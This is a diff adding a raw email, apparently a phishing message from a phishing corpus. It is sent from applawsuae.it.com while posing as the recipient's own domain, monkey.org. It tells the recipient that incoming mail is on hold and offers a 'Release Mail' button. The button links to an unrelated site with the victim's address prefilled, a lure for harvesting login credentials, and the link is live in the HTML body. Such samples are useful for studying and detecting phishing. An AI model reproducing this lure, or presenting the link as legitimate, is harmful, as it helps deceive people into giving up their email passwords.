@@ -1,0 +1,154 @@
+Return-Path: admin@applawsuae.it.com
+Delivered-To: jose@monkey.org
+X-FDA: 83922748266.15.D898CEE
+Received: from heuristic-sammet.45-129-199-67.plesk.page (applawsuae.it.com
+ [45.129.199.67])
+	by imf29.b.hostedemail.com (Postfix) with ESMTP id 41729120002
+	for <jose@monkey.org>; Wed, 24 Sep 2025 03:43:10 +0000 (UTC)
+Authentication-Results: imf29.b.hostedemail.com;
+	dkim=pass header.d=applawsuae.it.com header.s=default header.b=W9WoX3BM;
+	spf=pass (imf29.b.hostedemail.com: domain of admin@applawsuae.it.com
+ designates 45.129.199.67 as permitted sender)
+ smtp.mailfrom=admin@applawsuae.it.com;
+	dmarc=pass (policy=quarantine) header.from=applawsuae.it.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1758685391;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=jY7qo1sAEiRz6LgeUP43FWVr4IS4CRuRX+3izqxR5sg=;
+	b=wJwF1SGHK1DtDyqRe/7+O4IDIZhpNU3esICFcAUCzrssjYORHtEPqTAQxvjJkYV2MU8ZFh
+	EeoEfCHCDgCt8psvZnwImvTiHXQS2/wOLN9P2ZFKoLh/TawrxQYdCqBpO/9I5alujZHZuq
+	fmSSZdnLCYOhLCATJKwU5+wAzofZ6+E=
+ARC-Authentication-Results: i=1;
+	imf29.b.hostedemail.com;
+	dkim=pass header.d=applawsuae.it.com header.s=default header.b=W9WoX3BM;
+	spf=pass (imf29.b.hostedemail.com: domain of admin@applawsuae.it.com
+ designates 45.129.199.67 as permitted sender)
+ smtp.mailfrom=admin@applawsuae.it.com;
+	dmarc=pass (policy=quarantine) header.from=applawsuae.it.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1758685391; a=rsa-sha256;
+	cv=none;
+	b=xzPVdQVInXtV60mSZlu5Y2qAPfdXSQYyJUgh6eNKKxONSraastyKQnbwxoIO38lRiMFWxL
+	5k2TdqHlE6cZzItSCxDoCNJ5ziLLwl0i8jrAImqTA4Gs3pHAavcV+35NVoGyHPHP+vIX8r
+	7TU+ZlzrhgXRkSdpj2xKTb1uof50LJ4=
+Received: from [158.94.209.51] (unknown [158.94.209.51])
+	by heuristic-sammet.45-129-199-67.plesk.page (Postfix) with ESMTPSA id
+ 80FAE6DBE1
+	for <jose@monkey.org>; Wed, 24 Sep 2025 03:43:08 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=applawsuae.it.com;
+	s=default; t=1758685388;
+	bh=jY7qo1sAEiRz6LgeUP43FWVr4IS4CRuRX+3izqxR5sg=; h=From:To:Subject;
+	b=W9WoX3BMRZ4TtC0qI5uzGEXlWYIqvIFxEs8E4HbcNxVlMNI03UJrj/nQKSgFcMKAl
+	 ohj7roMmKvn/6QMrdyWWV4tQyWkR+Cdidu+WE20D3C2BtqF+DDsce+Jb3w3I3QfLM0
+	 eR0FX+h8bs44Hjnc2E20vPrs8HqgLzpSzGM+HAxWutopQT5RphJGpaUtc9MRKWrLS4
+	 9Hk60WZu/3gsJwx7yzUHpM2V4j+UKkC7bi+f1MS5YjW+yPwgtKQpE53Ddsj7L8+/bC
+	 pFSTSD75jLD0mapV+rWhoBboNoUF0r8Q4yY6o1bNVNokjjd1CfqjZJdzfjFEPySpKm
+	 hPJok2gmyvm0Q==
+Received-SPF: pass (heuristic-sammet.45-129-199-67.plesk.page: connection is
+ authenticated)
+From: "monkey.org"<admin@applawsuae.it.com>
+To: jose@monkey.org
+Subject: Incoming Messages For (jose@monkey.org) On Hold
+Date: 23 Sep 2025 20:43:07 -0700
+Message-ID: <20250923204307.0DB4658E80352751@applawsuae.it.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Stat-Signature: asrjojtnt4xhtgcso14qwk3i688kbbec
+X-Rspamd-Queue-Id: 41729120002
+X-Rspam-User: 
+X-Rspamd-Server: rspam12
+X-Spam-Status: No, score=2.97
+X-HE-Tag: 1758685390-720418
+X-HE-Meta: 
+ U2FsdGVkX1/b2aAO1mzsMTbcLAT7iCp7o3/yQFaoosn2R5Z05UwpaMxtSqOzD3xPIETwcNXQPd0umCBqhw8rpi9YLA75j+Z1PQVOY2/xGYI3UVrj7UYITE2EY1ezu1hdXVNybCvLRI0QzrHC3M61rXUtJ4XShMJiAiGvufLpf3sE9bXXYiaMDXOdhAC5V8lmoxc5H8Yla6Uhh5w1VU2Q/iDg+6HouRn96GF0rEgDG9gAnkzdzFdEwOqGgvH4txhS5bgUu+OSMq1P8Shrtommxrpq/nKT5Z0wieRxGmN1u8tAZZbZlLmOLyLHxMGgGZ3Q0s3oxfWG49ks3O5bvPx1c9ozZDm3/YIEEYGbjLflQB4RyCYPY5Lod7Z4WOtmiJadBCscbq+el/AqGjvvZON6e+CZuFGD5S1phYpj1ccl5hYWmc6p3C6VUo/YRidhoosj8viu+uF4FYIdgRH+poKPShwurXBZzdBLSwEB+SsUbEwmdpMm1VLnukSoE3XTmHYdlSwJw+fVsJfnXhpQTHJXBeYcGigBSljaDP7f8l4aACK9k5YRO4mMoy1ukPWq4sNxT4rQOSpp8nNJLNcqyVfkSZFT+3R3IaDGDVgnsE5Rv8t5G75u144RoCJzvBVIWVul95+Lni9Jti0TF1nOWWPKu5HxLq9YkvavWpIVl1IKlAuhTZL5y7mUEowyL5KhqIECsxvVpBjABo9pwFTGhdPSxtXHjSZv+Y65wu5Z31InVBqs+dBiQ05ew9h+YNHt4/Be224T0Nk+2sqepw4zjbPXxlJKEo/h6ENlPTnx2JGcAOL2XPtOa+x3vCMMd7awQCT1lw3o30M6RJeWevS1HEZBBClMed5fOvSKGlCJJXwEDDFwTbh9i3AhC4NoMw8Zzn6gAP8qU1cD34arI3ARgbj/FKqTDCaARaILZQqK7FoZFc5nB5aSx7HobAaBuh6zjBB/KgB3Hh6+FSB9Yy9oAx1E15ljQiH
+ RmoS5xFWF4AighWn6HGIvvp57zmccnEKMtBcoyAgGzQRlkhWEAZs6mA8sgN+EIsYRb1+R4tAw2nLo/t2Mu0HrlRibhQ+RJNP+Ygh4XaFUyB3gPY+LEZgHCyR34pTSCFVP8R3Dtuk3nVtPjtD8Sfkm3OVvJMiiAJWQCQSVchdWYvIrEO/b7Yq+5KX+TJQB4R/8wJcLpkeLNFZnaBaPR9jOH4lZIllIBLJnTDxDNmOo2ExGRrZ88pRBxhVSFBq49VSJ3OQvuIBX852ESBm8s07FcK2ZaN6aRYClnnmxwCIiQKHwAS7NeQdGA4hr81pZK0sr76eOdRWeLmNy+x4=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 368
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<div class=3D"x_elementToProof" style=3D"margin: 0px; padding: 0px; border:=
+ 0px currentColor; border-image: none; color: rgb(0, 0, 0); line-height: in=
+herit; font-family: Calibri, sans-serif; font-size: 11pt; font-style: inher=
+it; font-variant: inherit; font-weight: inherit; vertical-align: baseline; =
+font-size-adjust: inherit; font-stretch: inherit; font-feature-settings: in=
+herit; font-optical-sizing: inherit; font-kerning: inherit; font-variation-=
+settings: inherit;"=20
+data-olk-copy-source=3D"MessageBody">FYI</div>
+<div class=3D"x_elementToProof" style=3D"margin: 0px; padding: 0px; border:=
+ 0px currentColor; border-image: none; color: rgb(0, 0, 0); line-height: in=
+herit; font-family: Calibri, sans-serif; font-size: 11pt; font-style: inher=
+it; font-variant: inherit; font-weight: inherit; vertical-align: baseline; =
+font-size-adjust: inherit; font-stretch: inherit; font-feature-settings: in=
+herit; font-optical-sizing: inherit; font-kerning: inherit; font-variation-=
+settings: inherit;"=20
+data-olk-copy-source=3D"MessageBody"><hr style=3D"width: 847.3px; display: =
+inline-block;"></div><p></p><p><font size=3D"3"><span style=3D"font-size: s=
+mall;">Hi&nbsp;jose</span><br></font></p>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: arial, helvetica, sans-serif; font-si=
+ze: small; font-style: normal; font-weight: 400; margin-top: 0px; word-spac=
+ing: 0px; white-space: normal; orphans: 2; widows: 2; font-variant-ligature=
+s: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-=
+decoration-thickness: initial; text-decoration-style: initial; text-decorat=
+ion-color: initial;">
+You have incoming emails pending on monkey.org <strong>&nbsp;</strong>serve=
+r<br>Release emails to your mailbox.<br></p>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: arial, helvetica, sans-serif; font-si=
+ze: small; font-style: normal; font-weight: 400; margin-top: 0px; word-spac=
+ing: 0px; white-space: normal; orphans: 2; widows: 2; font-variant-ligature=
+s: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-=
+decoration-thickness: initial; text-decoration-style: initial; text-decorat=
+ion-color: initial;"></p>
+<p style=3D"color: rgb(44, 54, 58); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: roboto, sans-serif; font-size: 14px; =
+font-style: normal; font-weight: 400; margin-top: 0px; word-spacing: 0px; w=
+hite-space: normal; orphans: 2; widows: 2; font-variant-ligatures: normal; =
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial;"></p>
+<table style=3D"color: rgb(34, 34, 34); text-transform: none; letter-spacin=
+g: normal; font-family: arial, helvetica, sans-serif; font-size: small; fon=
+t-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; =
+border-collapse: collapse; orphans: 2; widows: 2; font-variant-ligatures: n=
+ormal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-deco=
+ration-thickness: initial; text-decoration-style: initial; text-decoration-=
+color: initial;"><tbody><tr>
+<td style=3D"margin: 0px; padding: 5px 7px; border-radius: 3px; color: whit=
+e; background-color: cornflowerblue;"><a style=3D"color: white; background-=
+color: transparent; text-decoration-line: none;" href=3D"https://lamko.net/=
+k/mme.html?email=3Djose@monkey.org&amp;amp;domain=3Dmonkey.org" target=3D"_=
+blank" rel=3D"noreferrer noopener noreferrer">Release Mail</a></td></tr></t=
+body></table>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: arial, helvetica, sans-serif; font-si=
+ze: small; font-style: normal; font-weight: 400; margin-top: 0px; word-spac=
+ing: 0px; white-space: normal; orphans: 2; widows: 2; font-variant-ligature=
+s: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-=
+decoration-thickness: initial; text-decoration-style: initial; text-decorat=
+ion-color: initial;"></p>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: arial, helvetica, sans-serif; font-si=
+ze: small; font-style: normal; font-weight: 400; margin-top: 0px; word-spac=
+ing: 0px; white-space: normal; orphans: 2; widows: 2; font-variant-ligature=
+s: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-=
+decoration-thickness: initial; text-decoration-style: initial; text-decorat=
+ion-color: initial;">Regards,<br></p>
+<p style=3D"color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; le=
+tter-spacing: normal; font-family: arial, sans-serif; font-size: 15px; font=
+-style: normal; font-weight: 400; margin-top: 0px; word-spacing: 0px; white=
+-space: normal; orphans: 2; widows: 2; font-variant-ligatures: normal; font=
+-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thic=
+kness: initial; text-decoration-style: initial; text-decoration-color: init=
+ial;"><span style=3D"font-weight: bolder;">
+monkey.org</span></p></body></html>
+
